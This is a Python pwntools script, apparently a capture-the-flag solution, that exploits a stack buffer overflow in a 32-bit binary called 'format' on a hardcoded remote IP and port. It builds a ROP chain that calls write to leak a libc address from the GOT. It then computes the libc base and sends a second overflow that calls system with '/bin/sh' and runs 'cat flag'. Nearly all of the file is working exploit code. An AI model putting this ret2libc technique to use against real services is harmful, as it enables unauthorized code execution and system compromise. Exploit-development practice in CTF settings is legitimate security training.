#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context(arch = 'i386', os = 'linux', log_level='debug')

exeFile = 'format'
#libFile = '/lib/i386-linux-gnu/libc.so.6'
libFile = './libc_32.so.6'

remoteIp = "124.126.19.106"
remotePort = 50754

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():

	leak_name = 'read'
	start = 0x08048888
	start = 0x111111
	li(rl())
	ret = 0x08048452
	p = 'A' * 0x88
	p += p32(0x804a000 + 0x100)
	#p += p32(ret)
	#p += p32(ret)
	#p += p32(ret)
	p += p32(exe.plt['write'])
	p += p32(start)
	p += p32(1)
	p += p32(exe.got[leak_name])
	p += p32(0x10)
	s(p)

	leak = u32(ru('\xf7')[-3:] + '\xf7')
	lib.address = leak - lib.sym[leak_name]
	sys = lib.sym['system']
	sh  = lib.address + 0x0015902b
	#sh  = lib.address + 0x0015ba0b

	li('lib_base ' + hex(lib.address))
	li('sys ' + hex(sys))
	li('sh ' + hex(sh))


	#ru('\x0a\x0a')
	#ru('\x0a')

	p = 'A' * 0x88
	p += p32(0xdeedbeef)
	p += p32(sys)
	p += p32(0)
	p += p32(sh)

	s(p)

	sl('cat flag')
	c()
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
